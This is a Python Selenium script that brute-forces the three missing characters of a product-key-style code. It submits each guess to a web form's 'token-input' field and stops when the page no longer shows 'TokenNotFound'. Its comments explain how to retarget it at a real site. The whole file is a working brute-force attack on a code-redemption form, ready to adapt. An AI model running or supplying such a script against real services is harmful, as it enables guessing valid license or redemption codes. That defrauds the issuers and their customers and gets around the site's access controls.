import itertools
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

# 1. SETUP
chars = "BCDFGHJKMPQRTVWXYZ2346789"
# Change this to the actual website URL (not the API URL)
target_url = "https://the-challenge-page.com"

prefix = "qthxk-rykm9-jtgwq-9"
suffix = "p-9j47z"

# Initialize the Chrome Driver
driver = webdriver.Chrome()


def start_selenium_brute():
    print("Starting Selenium-based attempt...")
    combinations = itertools.product(chars, repeat=3)

    # Open the website once
    driver.get(target_url)

    for count, combo in enumerate(combinations, 1):
        middle = "".join(combo)
        full_code = f"{prefix}{middle}{suffix}"

        try:
            # 2. FIND ELEMENTS
            # Replace 'token-input' with the actual ID or Name from the site
            input_box = driver.find_element(By.ID, "token-input")

            # 3. INTERACT
            input_box.clear()
            input_box.send_keys(full_code)
            input_box.send_keys(Keys.RETURN)  # This simulates hitting Enter

            # 4. LOGIC - Check if it worked
            # We wait a moment for the page to react
            time.sleep(0.5)

            # Check for success (e.g., if "TokenNotFound" is NO LONGER on the page)
            if "TokenNotFound" not in driver.page_source:
                print(f"\n[!!!] SUCCESS! The code is: {full_code}")
                print("The browser will remain open so you can click the button.")
                return  # Stops the loop and keeps the browser open

            # Progress update
            if count % 50 == 0:
                print(f"Tested {count} codes...")

        except Exception as e:
            print(f"Error encountered: {e}")
            # Refresh the page if things get stuck
            driver.get(target_url)
            time.sleep(1)


if __name__ == "__main__":
    start_selenium_brute()
    # This prevents the script from closing the window immediately
    input("Press Enter to exit and close the browser...")
    driver.quit()